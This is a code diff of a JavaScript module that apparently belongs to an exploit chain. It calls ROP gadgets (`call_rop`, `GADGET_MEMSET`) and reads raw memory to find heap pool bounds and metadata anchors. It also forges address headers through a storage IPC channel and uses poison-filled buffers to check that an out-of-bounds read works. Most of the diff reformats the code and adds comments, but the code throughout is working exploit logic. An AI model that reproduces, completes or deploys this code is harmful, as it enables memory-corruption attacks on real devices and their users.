@@ -1,42 +1,50 @@
 import coreRuntime from "../runtime.mjs";
 import {
-  buffersEqualFast,
-  checkAddressHeaderEncoding,
-  hasByteDifferentFast,
-  readFsAddressBytes,
-  readHexBytes
+    buffersEqualFast,
+    checkAddressHeaderEncoding,
+    hasByteDifferentFast,
+    readFsAddressBytes
 } from "./util.mjs";
 import {installAddressHeader} from "./cache.mjs";
 import {scanNativeLinkBuffer} from "./scan.mjs";
 
 const {
-  AnalysisBytes,
-  CachePlan,
-  GADGET_MEMSET,
-  RootLayout,
-  allocPage,
-  call_rop,
-  hex32,
-  ipcStorageRead,
-  read64
+    AnalysisBytes,
+    CachePlan,
+    GADGET_MEMSET,
+    RootLayout,
+    allocPage,
+    call_rop,
+    hex32,
+    ipcStorageRead,
+    read64
 } = coreRuntime;
 
-// ── Pool and metadata discovery ───────────────────────────────────────────
+// ----- Pool and metadata discovery -----
 
+/** Forward a discovery progress line to the caller's reporter, when it has one. */
 export async function reportMetadataProgress(input, message) {
-    if (typeof input.reportProgress !== "function") return;
+    if (typeof input.reportProgress !== "function") {
+        return;
+    }
 
     await input.reportProgress(message);
 }
 
+/** Read the window an external link points at, with its own bounds check. */
 async function readExternalLinkWindow(input) {
     var result = await readFsAddressBytes({...input,
         materializeBytes: false});
-    // A candidate in the final cycle bytes needs a second cache-chunk read.
-    // Keep the existing materialized path for that boundary case.
+
+    /*
+     * A candidate sitting in the last cycle bytes needs a second cache-chunk read,
+     * so that boundary case keeps the existing materialized path.
+     */
     if (!result.ok && result.error ===
-        "buffer-only reads require one aligned cache chunk")
+        "buffer-only reads require one aligned cache chunk") {
         result = await readFsAddressBytes(input);
+    }
+
     return result;
 }
 
@@ -48,6 +56,7 @@ function extractExternalLinkFields(result, offset) {
             extent: AnalysisBytes.readU64LE(result.bytes, offset + 16)
         };
     }
+
     var base = result.buffer + BigInt((result.bufferOffset || 0) + offset);
     return {next: read64(base), previous: read64(base + 8n),
         extent: read64(base + 16n)};
@@ -61,72 +70,93 @@ function externalLinkFieldsBytes(fields) {
     return bytes;
 }
 
+/**
+ * Turn heap links into pool candidates: read the window each external link points
+ * at, keep the ones that parse, and return the bounded list the anchor search
+ * starts from.
+ */
 export async function resolvePoolCandidates(seed, sourceLinks, outputBuf, label, input) {
     const config = input.config;
-    let addressPlan = input.addressPlan;
-    let candidateHandle = input.candidateHandle;
-    // The payload reserves live progress logs for external-link checks;
-    // callers without a progress callback retain the detailed scan logs.
+    const addressPlan = input.addressPlan;
+    const candidateHandle = input.candidateHandle;
+
+    /*
+     * The payload keeps live progress logs for the external-link checks, so a caller
+     * without a progress callback still gets the detailed scan logs.
+     */
     var links = sourceLinks.slice();
     var captures = [{address: seed, length: 0x500000}];
     var seen = {};
-    for (var si = 0; si < links.length; si++)
+    for (var si = 0; si < links.length; si++) {
         seen[links[si].source.toString(16) + ":" +
             links[si].value.toString(16)] = true;
+    }
 
     for (var refinement = 0;
         refinement <= config.MAX_POOL_REFINEMENT_READS; refinement++) {
         var bounds = RootLayout.derivePoolBounds(links, seed, {controlSize: config.CONTROL_SIZE});
+
         if (!bounds.candidates.length) {
-            if (!input.reportProgress)
-                await reportMetadataProgress(input, "METADATA " + label +
-                    ": no pool hypothesis fits " + links.length +
-                    " native links");
+            if (!input.reportProgress) {
+                await reportMetadataProgress(input, "METADATA " + label + ": no pool hypothesis fits " + links.length + " native links");
+            }
+
             return {ok: true, candidates: [], links: links.length,
                 refinementReads: refinement};
         }
+
         if (bounds.candidates.length <= config.MAX_POOL_ANCHOR_CANDIDATES) {
-            // The payload reports the combined scan result after the
-            // external-link checks. Keep this detail for legacy log callers.
-            if (!input.reportProgress)
-                await reportMetadataProgress(input, "METADATA " + label +
-                    ": pool bounds resolved " + bounds.candidates.length +
-                    " candidate(s), links=" + links.length +
-                    " refinements=" + refinement);
+
+            /*
+             * The payload reports the combined scan result once the external-link
+             * checks are done. Legacy log callers keep this detail.
+             */
+            if (!input.reportProgress) {
+                await reportMetadataProgress(input, "METADATA " + label + ": pool bounds resolved " + bounds.candidates.length +
+                    " candidate(s), links=" + links.length + " refinements=" + refinement);
+            }
+
             return {ok: true, candidates: bounds.candidates,
                 links: links.length, refinementReads: refinement};
         }
+
         if (refinement === config.MAX_POOL_REFINEMENT_READS) {
-            if (!input.reportProgress)
-                await reportMetadataProgress(input, "METADATA " + label +
-                    ": pool bounds remain ambiguous after " + refinement +
-                    " refinement reads (" + bounds.candidates.length +
-                    " candidates); checking their external-link locations " +
+            if (!input.reportProgress) {
+                await reportMetadataProgress(input, "METADATA " + label + ": pool bounds remain ambiguous after " + refinement +
+                    " refinement reads (" + bounds.candidates.length + " candidates); checking their external-link locations " +
                     "within the remaining budget");
+            }
+
             return {ok: true, candidates: bounds.candidates, unresolved: true,
                 links: links.length, refinementReads: refinement};
         }
 
         var readStart = RootLayout.choosePoolRefinementStart(bounds, links, captures,
-            addressPlan.addressBias, config.ROOT_CAPTURE_CHUNK, refinement,
-            {controlSize: config.CONTROL_SIZE, maxPoolCandidates: config.MAX_POOL_ANCHOR_CANDIDATES});
+                                                             addressPlan.addressBias, config.ROOT_CAPTURE_CHUNK, refinement,
+                                                             {controlSize: config.CONTROL_SIZE, maxPoolCandidates: config.MAX_POOL_ANCHOR_CANDIDATES});
+
         if (readStart === null) {
-            if (!input.reportProgress)
-                await reportMetadataProgress(input, "METADATA " + label +
-                    ": no uncovered bucket lies inside all pool hypotheses; " +
-                    "checking " + bounds.candidates.length +
-                    " candidate external-link locations");
+            if (!input.reportProgress) {
+                await reportMetadataProgress(input, "METADATA " + label + ": no uncovered bucket lies inside all pool hypotheses; " +
+                    "checking " + bounds.candidates.length + " candidate external-link locations");
+            }
+
             return {ok: true, candidates: bounds.candidates, unresolved: true,
                 links: links.length, refinementReads: refinement};
         }
+
         var chunkWindow = {start: readStart,
             end: readStart + config.ROOT_CAPTURE_CHUNK};
         var chunkRead = await readFsAddressBytes({config, addressPlan,
             candidateHandle, address: readStart,
             length: config.ROOT_CAPTURE_CHUNK, outputBuf,
             allowedWindow: chunkWindow, materializeBytes: false});
-        if (!chunkRead.ok) return {ok: false,
-            continueSeed: !chunkRead.fatal, error: chunkRead.error};
+
+        if (!chunkRead.ok) {
+            return {ok: false,
+                continueSeed: !chunkRead.fatal, error: chunkRead.error};
+        }
+
         var scannedLinks = scanNativeLinkBuffer({buffer: chunkRead.buffer,
             bufferOffset: chunkRead.bufferOffset,
             length: config.ROOT_CAPTURE_CHUNK, sourceAddress: readStart,
@@ -134,46 +164,59 @@ export async function resolvePoolCandidates(seed, sourceLinks, outputBuf, label,
         links = scannedLinks.links;
         seen = scannedLinks.seen;
         captures.push({address: readStart, length: config.ROOT_CAPTURE_CHUNK});
+
         if (!input.reportProgress) {
-            await reportMetadataProgress(input, "METADATA " + label +
-                ": pool refinement " + (refinement + 1) + "/" +
-                config.MAX_POOL_REFINEMENT_READS + " links=" + links.length +
-                " candidates=" + RootLayout.derivePoolBounds(links, seed,
-                    {controlSize: config.CONTROL_SIZE}).candidates.length);
+            await reportMetadataProgress(input, "METADATA " + label + ": pool refinement " + (refinement + 1) + "/" +
+                config.MAX_POOL_REFINEMENT_READS + " links=" + links.length + " candidates=" + RootLayout.derivePoolBounds(links, seed,
+                                                                                                                           {controlSize: config.CONTROL_SIZE}).candidates.length);
         }
     }
     var finalBounds = RootLayout.derivePoolBounds(links, seed,
-        {controlSize: config.CONTROL_SIZE});
+                                                  {controlSize: config.CONTROL_SIZE});
     return {ok: true, candidates: finalBounds.candidates, unresolved: true,
         links: links.length, refinementReads: config.MAX_POOL_REFINEMENT_READS};
 }
 
+/**
+ * Capture the root layout around one seed and collect its metadata anchors.
+ * `continueSeed` tells the caller another candidate plan is worth a try; it is not
+ * a success flag.
+ */
 export async function discoverMetadataAnchors(seedPlan, label, input) {
     const withStepData = (result) => ({...result, metadataAnchorChecks, addressPlan});
     const config = input.config;
     let addressPlan = input.addressPlan;
-    let candidateHandle = input.candidateHandle;
+    const candidateHandle = input.candidateHandle;
     let metadataAnchorChecks = input.metadataAnchorChecks;
     addressPlan = seedPlan;
-    if (metadataAnchorChecks >= config.MAX_METADATA_ANCHOR_CHECKS)
+
+    if (metadataAnchorChecks >= config.MAX_METADATA_ANCHOR_CHECKS) {
         return withStepData({ok: true, anchors: [], continueSeed: false,
             capReached: true});
+    }
+
     var seed = Number(seedPlan.target);
     var sourceLength = 0x500000;
     var sourceEnd = seed + sourceLength;
+
     if (!Number.isSafeInteger(seed) || !Number.isSafeInteger(sourceEnd) ||
         seed % config.CONTROL_SIZE !== 0 || sourceEnd >= 0x8000000000) {
         return withStepData({ok: false, continueSeed: true,
             error: "seed capture bounds are not canonical/aligned"});
     }
 
-    if (!input.reportProgress)
-        await reportMetadataProgress(input, "METADATA " + label +
-            ": reading seed window [0x" + seed.toString(16) + ",0x" +
+    if (!input.reportProgress) {
+        await reportMetadataProgress(input, "METADATA " + label + ": reading seed window [0x" + seed.toString(16) + ",0x" +
             sourceEnd.toString(16) + ") bytes=0x500000 chunks=32");
+    }
+
     var captureBuf = allocPage(config.ROOT_CAPTURE_CHUNK + 0x2000);
-    if (!captureBuf) return withStepData({ok: false, continueSeed: false,
-        error: "seed capture buffer allocation failed"});
+
+    if (!captureBuf) {
+        return withStepData({ok: false, continueSeed: false,
+            error: "seed capture buffer allocation failed"});
+    }
+
     var links = [];
     var seen = {};
     var sourceWindow = {start: seed, end: sourceEnd};
@@ -184,31 +227,42 @@ export async function discoverMetadataAnchors(seedPlan, label, input) {
             candidateHandle, address: chunkAddress,
             length: config.ROOT_CAPTURE_CHUNK, outputBuf: captureBuf,
             allowedWindow: sourceWindow, materializeBytes: false});
-        if (!chunkRead.ok) return withStepData({ok: false,
-            continueSeed: !chunkRead.fatal, error: "seed chunk " +
-                chunkIndex + ": " + chunkRead.error});
+
+        if (!chunkRead.ok) {
+            return withStepData({ok: false,
+                continueSeed: !chunkRead.fatal, error: "seed chunk " +
+                    chunkIndex + ": " + chunkRead.error});
+        }
+
         var scannedLinks = scanNativeLinkBuffer({buffer: chunkRead.buffer,
             bufferOffset: chunkRead.bufferOffset,
             length: config.ROOT_CAPTURE_CHUNK, sourceAddress: chunkAddress,
             seed, links, seen, config});
         links = scannedLinks.links;
         seen = scannedLinks.seen;
+
         if ((chunkIndex + 1) % 8 === 0 &&
             chunkIndex + 1 < 0x500000 / config.ROOT_CAPTURE_CHUNK) {
             await reportMetadataProgress(input, "METADATA " + label + ": seed progress=" +
                 (chunkIndex + 1) + "/32 links=" + links.length);
         }
     }
-    await reportMetadataProgress(input, "METADATA " + label +
-        ": seed capture complete; native links=" + links.length);
-    if (!links.length) return withStepData({ok: true, anchors: [],
-        continueSeed: true, poolCandidates: 0, externalLinkChecks: 0});
+    await reportMetadataProgress(input, "METADATA " + label + ": seed capture complete; native links=" + links.length);
+
+    if (!links.length) {
+        return withStepData({ok: true, anchors: [], continueSeed: true,
+            poolCandidates: 0, externalLinkChecks: 0});
+    }
 
     var poolResult = await resolvePoolCandidates(seed, links, captureBuf,
-        label, {config, addressPlan, candidateHandle,
-            reportProgress: input.reportProgress});
-    if (!poolResult.ok) return withStepData({ok: false,
-        continueSeed: poolResult.continueSeed, error: poolResult.error});
+                                                 label, {config, addressPlan, candidateHandle,
+                                                     reportProgress: input.reportProgress});
+
+    if (!poolResult.ok) {
+        return withStepData({ok: false,
+            continueSeed: poolResult.continueSeed, error: poolResult.error});
+    }
+
     if (!poolResult.candidates.length) {
         return withStepData({ok: true, anchors: [], continueSeed: true,
             unresolved: Boolean(poolResult.unresolved), poolCandidates: 0,
@@ -227,12 +281,13 @@ export async function discoverMetadataAnchors(seedPlan, label, input) {
         poolCandidatesVisited = poolIndex + 1;
         var poolStart = poolResult.candidates[poolIndex];
         var anchorAddress = poolStart + 0x3a00000;
+
         if (!Number.isSafeInteger(anchorAddress) ||
             anchorAddress < 0x100000000 || anchorAddress >= 0x8000000000) {
             continue;
         }
-        var alignedStart = seedPlan.addressBias + Math.floor(
-            (anchorAddress - seedPlan.addressBias) / config.ROOT_CAPTURE_CHUNK) *
+
+        var alignedStart = seedPlan.addressBias + Math.floor((anchorAddress - seedPlan.addressBias) / config.ROOT_CAPTURE_CHUNK) *
             config.ROOT_CAPTURE_CHUNK;
         var anchorOffset = anchorAddress - alignedStart;
         var anchorLength = anchorOffset + 0x1000;
@@ -240,39 +295,45 @@ export async function discoverMetadataAnchors(seedPlan, label, input) {
             end: alignedStart + anchorLength};
         metadataAnchorChecks++;
         externalLinkChecks++;
-        await reportMetadataProgress(input, "METADATA " + label +
-            ": checking external-link candidate " + (poolIndex + 1) + "/" +
-            poolResult.candidates.length + " (check " + externalLinkChecks +
-            "/" + config.MAX_METADATA_ANCHOR_CHECKS + ")");
+        await reportMetadataProgress(input, "METADATA " + label + ": checking external-link candidate " + (poolIndex + 1) + "/" +
+            poolResult.candidates.length + " (check " + externalLinkChecks + "/" + config.MAX_METADATA_ANCHOR_CHECKS + ")");
         var linkReadA = await readExternalLinkWindow({config, addressPlan,
             candidateHandle, address: alignedStart, length: anchorLength,
             outputBuf: captureBuf, allowedWindow: anchorWindow});
+
         if (!linkReadA.ok) {
             if (linkReadA.fatal) {
                 if (anchors.length > 0) {
                     return withStepData({ok: true, anchors: anchors, continueSeed: false,
                         stopAfterAnchors: true, error: linkReadA.error});
                 }
+
                 return withStepData({ok: false, continueSeed: false,
                     error: linkReadA.error});
             }
+
             continue;
         }
+
         var linkFieldsA = extractExternalLinkFields(linkReadA, anchorOffset);
         var linkReadB = await readExternalLinkWindow({config, addressPlan,
             candidateHandle, address: alignedStart, length: anchorLength,
             outputBuf: captureBuf, allowedWindow: anchorWindow});
+
         if (!linkReadB.ok) {
             if (linkReadB.fatal) {
                 if (anchors.length > 0) {
                     return withStepData({ok: true, anchors: anchors, continueSeed: false,
                         stopAfterAnchors: true, error: linkReadB.error});
                 }
+
                 return withStepData({ok: false, continueSeed: false,
                     error: linkReadB.error});
             }
+
             continue;
         }
+
         var linkFieldsB = extractExternalLinkFields(linkReadB, anchorOffset);
         var nextA = linkFieldsA.next;
         var previousA = linkFieldsA.previous;
@@ -294,27 +355,53 @@ export async function discoverMetadataAnchors(seedPlan, label, input) {
         var extentShapeOk = extentA >= 0x10000n &&
             extentA <= 0x10000000n && extentA % 0x1000n === 0n;
         var externalLink = stableLink
-            ? RootLayout.parseExternalLink(
-                externalLinkFieldsBytes(linkFieldsA), 0, anchorAddress)
+            ? RootLayout.parseExternalLink(externalLinkFieldsBytes(linkFieldsA), 0, anchorAddress)
             : null;
+
         if (!externalLink) {
             var rejectionReasons = [];
-            if (!stableLink) rejectionReasons.push("fields-unstable");
-            if (!nextShapeOk) rejectionReasons.push("next-shape");
-            if (!reciprocalOk) rejectionReasons.push("not-reciprocal");
-            if (!distanceOk) rejectionReasons.push("next-distance");
-            if (!extentShapeOk) rejectionReasons.push("extent-shape");
-            if (!rejectionReasons.length) rejectionReasons.push("parser-rejected");
+
+            if (!stableLink) {
+                rejectionReasons.push("fields-unstable");
+            }
+
+            if (!nextShapeOk) {
+                rejectionReasons.push("next-shape");
+            }
+
+            if (!reciprocalOk) {
+                rejectionReasons.push("not-reciprocal");
+            }
+
+            if (!distanceOk) {
+                rejectionReasons.push("next-distance");
+            }
+
+            if (!extentShapeOk) {
+                rejectionReasons.push("extent-shape");
+            }
+
+            if (!rejectionReasons.length) {
+                rejectionReasons.push("parser-rejected");
+            }
+
             continue;
         }
+
         var metadataWindow = RootLayout.metadataWindowFromNext(externalLink.next);
+
         if (!metadataWindow || metadataWindow.anchorOffset + 16 >
             metadataWindow.length) {
             continue;
         }
+
         var anchorKey = metadataWindow.address.toString(16) + ":" +
             anchorAddress.toString(16);
-        if (anchorSeen[anchorKey]) continue;
+
+        if (anchorSeen[anchorKey]) {
+            continue;
+        }
+
         anchorSeen[anchorKey] = true;
         anchors.push({poolStart: poolStart, nodeAddress: anchorAddress,
             next: Number(externalLink.next), extent: Number(externalLink.extent),
@@ -333,14 +420,19 @@ export async function discoverMetadataAnchors(seedPlan, label, input) {
         refinementReads: poolResult.refinementReads});
 }
 
+/**
+ * Prove one metadata page: the reciprocal link has to point back and the page guards
+ * have to hold before its bytes are trusted. `continueScan` keeps the seed alive for
+ * the next anchor.
+ */
 export async function qualifyMetadataPage(anchor, label, pointerTargets, input) {
     const withStepData = (result) => ({...result, addressPlan, addressCopy});
     const config = input.config;
     let addressPlan = input.addressPlan;
-    let metadataPageProbes = input.metadataPageProbes;
-    let storageHandle = input.storageHandle;
-    let candidateHandle = input.candidateHandle;
-    let savedHandle = input.savedHandle;
+    const metadataPageProbes = input.metadataPageProbes;
+    const storageHandle = input.storageHandle;
+    const candidateHandle = input.candidateHandle;
+    const savedHandle = input.savedHandle;
     let addressCopy = input.addressCopy;
     var page = anchor.window.address;
     var plan;
@@ -348,63 +440,85 @@ export async function qualifyMetadataPage(anchor, label, pointerTargets, input) 
         var alignedTargets = pointerTargets.slice();
         alignedTargets.push(Math.floor(page / config.CONTROL_SIZE) * config.CONTROL_SIZE);
         plan = CachePlan.buildLowerWindowPlan(page, addressPlan.storageSize,
-            config.ROOT_CAPTURE_CHUNK, alignedTargets);
-    } catch (planError) {
+                                              config.ROOT_CAPTURE_CHUNK, alignedTargets);
+    } catch {
         return withStepData({ok: false, continueScan: true});
     }
     var encoding = checkAddressHeaderEncoding(plan.bytes, {savedHandle});
+
     if (!encoding.ok) {
         return withStepData({ok: false, continueScan: true});
     }
+
     var window = anchor.window;
+
     if (window.anchorOffset < 0 || window.anchorOffset + 16 > window.length ||
         page < 0x100000000 || page + window.length >= 0x8000000000) {
         return withStepData({ok: false, continueScan: true});
     }
+
     var ordinaryBuf = allocPage(config.CONTROL_SIZE + 0x2000);
     var pageBufA = allocPage(config.CONTROL_SIZE + 0x2000);
     var pageBufB = allocPage(config.CONTROL_SIZE + 0x2000);
-    if (!ordinaryBuf || !pageBufA || !pageBufB)
+
+    if (!ordinaryBuf || !pageBufA || !pageBufB) {
         return withStepData({ok: false, continueScan: false,
             error: "metadata page buffer allocation failed"});
+    }
+
     call_rop(GADGET_MEMSET, ordinaryBuf, 0xA5n, BigInt(window.length));
     var ordinaryRead = ipcStorageRead(storageHandle, plan.readOffset,
-        window.length, ordinaryBuf);
-    if (ordinaryRead.error !== 0) return withStepData({ok: false,
-        continueScan: false, error: "ordinary metadata control=" +
-            hex32(ordinaryRead.error)});
-    if (!hasByteDifferentFast(ordinaryBuf, window.length, 0xA5))
+                                      window.length, ordinaryBuf);
+
+    if (ordinaryRead.error !== 0) {
+        return withStepData({ok: false,
+            continueScan: false, error: "ordinary metadata control=" +
+                hex32(ordinaryRead.error)});
+    }
+
+    if (!hasByteDifferentFast(ordinaryBuf, window.length, 0xA5)) {
         return withStepData({ok: false, continueScan: false,
             error: "ordinary metadata control remained poison"});
+    }
 
     var headerCopy = await installAddressHeader({...addressCopy,
         desiredBytes: plan.bytes,
         stageName: "cache-metadata-page-" + metadataPageProbes,
         shouldStop: input.shouldStop});
     addressCopy = headerCopy.addressCopy;
+
     if (!headerCopy.ok) {
         return withStepData({ok: false, continueScan: false,
             error: "metadata page header copy failed"});
     }
+
     addressPlan = plan;
     var pageWindow = {start: page, end: page + window.length};
     var pageReadA = await readFsAddressBytes({config, addressPlan,
         candidateHandle, address: page, length: window.length,
         outputBuf: pageBufA, allowedWindow: pageWindow});
-    if (!pageReadA.ok) return withStepData({ok: false,
-        continueScan: !pageReadA.fatal, error: pageReadA.error});
+
+    if (!pageReadA.ok) {
+        return withStepData({ok: false,
+            continueScan: !pageReadA.fatal, error: pageReadA.error});
+    }
+
     var pageReadB = await readFsAddressBytes({config, addressPlan,
         candidateHandle, address: page, length: window.length,
         outputBuf: pageBufB, allowedWindow: pageWindow});
-    if (!pageReadB.ok) return withStepData({ok: false,
-        continueScan: !pageReadB.fatal, error: pageReadB.error});
+
+    if (!pageReadB.ok) {
+        return withStepData({ok: false,
+            continueScan: !pageReadB.fatal, error: pageReadB.error});
+    }
+
     var expectedNode = BigInt(anchor.nodeAddress);
     var firstA = AnalysisBytes.readU64LE(pageReadA.bytes, window.anchorOffset);
     var previousA = AnalysisBytes.readU64LE(pageReadA.bytes,
-        window.anchorOffset + 8);
+                                            window.anchorOffset + 8);
     var firstB = AnalysisBytes.readU64LE(pageReadB.bytes, window.anchorOffset);
     var previousB = AnalysisBytes.readU64LE(pageReadB.bytes,
-        window.anchorOffset + 8);
+                                            window.anchorOffset + 8);
     var stableAnchor = firstA === firstB && previousA === previousB;
     var reciprocalAnchor = firstA === expectedNode &&
         previousA === expectedNode && firstB === expectedNode &&
@@ -419,21 +533,28 @@ export async function qualifyMetadataPage(anchor, label, pointerTargets, input) 
         page: page, window: window});
 }
 
+/**
+ * Read through one address plan and verify the copy landed where the plan says.
+ * `continueScan` means the next candidate plan may still qualify.
+ */
 export async function verifyAddressCandidate(plan, label, index, input) {
     const withStepData = (result) => ({...result, addressPlan, addressCopy});
     const config = input.config;
     let addressPlan = input.addressPlan;
-    let candidateHandle = input.candidateHandle;
-    let storageHandle = input.storageHandle;
+    const candidateHandle = input.candidateHandle;
+    const storageHandle = input.storageHandle;
     let addressCopy = input.addressCopy;
     addressPlan = plan;
     var ordinaryBuf = allocPage(config.CONTROL_SIZE + 0x2000);
+
     if (!ordinaryBuf) {
         return withStepData({verified: false, continueScan: false});
     }
+
     call_rop(GADGET_MEMSET, ordinaryBuf, 0xA5n, BigInt(config.CONTROL_SIZE));
     var ordinaryReply = ipcStorageRead(storageHandle, plan.readOffset,
-        config.CONTROL_SIZE, ordinaryBuf);
+                                       config.CONTROL_SIZE, ordinaryBuf);
+
     if (ordinaryReply.error !== 0) {
         return withStepData({verified: false, continueScan: false});
     }
@@ -442,22 +563,25 @@ export async function verifyAddressCandidate(plan, label, index, input) {
         desiredBytes: plan.bytes, stageName: "cache-address-" + index,
         shouldStop: input.shouldStop});
     addressCopy = headerCopy.addressCopy;
+
     if (!headerCopy.ok) {
         return withStepData({verified: false, continueScan: false});
     }
 
     var addressBufA = allocPage(config.CONTROL_SIZE + 0x2000);
     var addressBufB = allocPage(config.CONTROL_SIZE + 0x2000);
+
     if (!addressBufA || !addressBufB) {
         return withStepData({verified: false, continueScan: false});
     }
+
     call_rop(GADGET_MEMSET, addressBufA, 0xA5n, BigInt(config.CONTROL_SIZE));
     call_rop(GADGET_MEMSET, addressBufB, 0x5An, BigInt(config.CONTROL_SIZE));
 
     var readA = ipcStorageRead(candidateHandle, plan.readOffset,
-        config.CONTROL_SIZE, addressBufA);
+                               config.CONTROL_SIZE, addressBufA);
     var readB = ipcStorageRead(candidateHandle, plan.readOffset,
-        config.CONTROL_SIZE, addressBufB);
+                               config.CONTROL_SIZE, addressBufB);
     var stable = readA.error === 0 && readB.error === 0 &&
         buffersEqualFast(addressBufA, addressBufB, config.CONTROL_SIZE);
     var differsFromControl = readA.error === 0 &&
